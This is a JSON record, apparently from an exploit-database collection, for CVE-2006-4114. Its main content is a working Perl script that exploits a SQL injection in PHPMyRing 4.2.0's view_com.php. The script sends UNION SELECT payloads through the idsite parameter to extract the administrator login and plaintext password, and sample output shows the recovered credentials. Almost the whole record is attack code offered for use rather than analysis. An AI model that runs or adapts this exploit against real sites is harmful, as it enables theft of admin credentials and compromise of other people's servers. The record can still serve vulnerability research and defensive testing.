{
  "id": "2159",
  "title": "PHPMyRing 4.2.0 - &#039;view_com.php&#039; SQL Injection",
  "cve": "CVE-2006-4114",
  "vuln_type": "sqli",
  "code": "# Title: PHPMyRing's (view_com.php) Remote SQL injection Exploit\r\n#\r\n# Vendor: phpmyring\r\n#\r\n# webiste : http://phpmyring.sourceforge.net/\r\n#\r\n# Version : <= 4.2.0\r\n#\r\n# Severity: Critical\r\n#\r\n# Discovered by: Simo64 <simo64_at_morx_org>\r\n# \r\n# Exploit writting by: Simo Ben youssef <simo_at_morx_org>\r\n#\r\n# Discovered: 09 Aout 2006\r\n# \r\n# Published : 10 Aout 2006\r\n# \r\n# MorX Security Research Team\r\n# \r\n# http://www.morx.org\r\n#\r\n# Details: \r\n#\r\n# vulnerable code on view_com.php line ( 14 - 24)\r\n# \r\n# [code]\r\n# -----------------------------------------------------------------------------------\r\n# if (!$idsite)\r\n#    {\r\n#    echo \"<p align=\\\"center\\\">\"._(\"Erreur! Le n&deg; du site n'est pas d&eacute;fini!\").\"</p>\";\r\n#    }\r\n# else\r\n#     {\r\n#     // On va aller chercher le nom du site consern., .a sera fait ;)\r\n#     // Connexion MySQL\r\n#     $conn=connecte();\r\n#     $row=mysql_fetch_array(requete(\"SELECT site_nom FROM webring WHERE idsite=$idsite\"));  # <== SQL injection\r\n#     $site_nom=$row['site_nom'];\r\n#     \r\n# ...............\r\n# \r\n# <!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\">\r\n# <html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"<? echo _(\"fr\"); ?>\">\r\n# <head>\r\n# <title><? echo _(\"Commentaires du site\"). \" \".$site_nom; ?></title>    \r\n# ---------------------------------------------------------------------------------[/code]\r\n# \r\n# $idsite is not properly sanitized and can be used to inject sql query\r\n# \r\n# Exploit to extract both admin login and plain text password:\r\n#\r\n# C:\\>perl ring.pl 127.0.0.1 webring\r\n# #################################################\r\n# #   PHPMyRing's Remote SQL injection Exploit    #\r\n# #   Discovered by simo64_at_morx_org            #\r\n# #   Script writting by simo_at_morx_org         #\r\n# #         MorX Security Research Team           #\r\n# #                 www.morx.org                  #\r\n# #################################################\r\n\r\n# [*] Trying to get the admin login ...\r\n\r\n# [+] your admin login is --> admin\r\n\r\n# [+] your admin pass is --> 123456\r\n \r\nuse IO::Socket;\r\n\r\nif(!defined($ARGV[0] && $ARGV[1])) {\r\n\r\nsystem (clear);\r\nprint \"\\n\";\r\nprint \"#################################################\\n\";\r\nprint \"#   PHPMyRing's Remote SQL injection Exploit    #\\n\";\r\nprint \"#   Discovered by simo64_at_morx_org            #\\n\";\r\nprint \"#   Script writting by simo_at_morx_org         #\\n\";\r\nprint \"#         MorX Security Research Team           #\\n\";\r\nprint \"#                 www.morx.org                  #\\n\";\r\nprint \"#################################################\\n\\n\";\r\n\r\nprint \"--- Usage:   perl $0 <host> <folder>\\n\";\r\nprint \"--- Example: perl $0 127.0.0.1 afd_webring\\n\\n\";\r\nexit; }\r\n\r\n$TARGET            = $ARGV[0];\r\n\r\n$FOLDER            = $ARGV[1];\r\n\r\n$PORT              = \"80\";\r\n\r\n$SCRIPT            = \"/view_com.php?idsite=\";\r\n\r\n$SQLPASS           = \"-1%20UNION%20SELECT%20passadm%20FROM%20webring_adm\";\r\n\r\n$SQLADMIN          = \"-1%20UNION%20SELECT%20loginadm%20FROM%20webring_adm\";\r\n\r\n################################################################################\r\n\r\n$COMMAND1         = \"GET /$FOLDER$SCRIPT$SQLADMIN HTTP/1.1\";\r\n$COMMAND2         = \"Host: $TARGET\";\r\n$COMMAND3         = \"Connection: Close\";\r\n$COMMAND4         = \"GET /$FOLDER$SCRIPT$SQLPASS HTTP/1.1\";\r\n\r\n$remote = IO::Socket::INET->new(Proto=>\"tcp\",PeerAddr=>\"$TARGET\",PeerPort=>\"$PORT\")\r\n|| die \"Can't connect to $TARGET\";\r\n\r\nprint \"#################################################\\n\";\r\nprint \"#   PHPMyRing's Remote SQL injection Exploit    #\\n\";\r\nprint \"#   Discovered by simo64_at_morx_org            #\\n\";\r\nprint \"#   Script writting by simo_at_morx_org         #\\n\";\r\nprint \"#         MorX Security Research Team           #\\n\";\r\nprint \"#                 www.morx.org                  #\\n\";\r\nprint \"#################################################\\n\\n\";\r\n\r\nsleep 2;\r\n\r\nprint \"[*] Trying to get the admin login ...\\n\\n\";\r\n\r\nprint $remote \"$COMMAND1\\n$COMMAND2\\n$COMMAND3\\n\\n\";\r\n\r\nwhile ($result = <$remote> ) {\r\n\r\nif ($result =~ /site (.*?)</ ) {\r\n$adminlogin = $1;\r\nprint \"[+] your admin login is --> $adminlogin\\n\\n\";\r\n$a = 1;\r\n}\r\n}\r\n\r\nif ($a == 0) \r\n{ \r\nprint \"[-] Failed, cant get the admin login\\n\\n\";\r\nprint \"[*] Trying to get the admin password ...\\n\\n\";\r\n}\r\n\r\n$remote = IO::Socket::INET->new(Proto=>\"tcp\",PeerAddr=>\"$TARGET\",PeerPort=>\"$PORT\")\r\n|| die \"Can't connect to $TARGET\";\r\n\r\nprint $remote \"$COMMAND4\\n$COMMAND2\\n$COMMAND3\\n\\n\";\r\n\r\nwhile ($result2 = <$remote> ) {\r\n\r\nif ($result2 =~ /site (.*?)</ ) {\r\n$adminpass = $1;\r\nprint \"[+] your admin pass is --> $adminpass\\n\\n\";\r\n$b = 1;\r\n}\r\n}\r\n\r\nif ($b == 0)\r\n{ print \"[-] Failed, cant get the admin password\\n\";\r\n}\r\n\r\n$remote->flush();\r\nclose($remote);\r\nexit;\r\n\r\n# milw0rm.com [2006-08-09]",
  "url": "https://www.exploit-db.com/exploits/2159"
}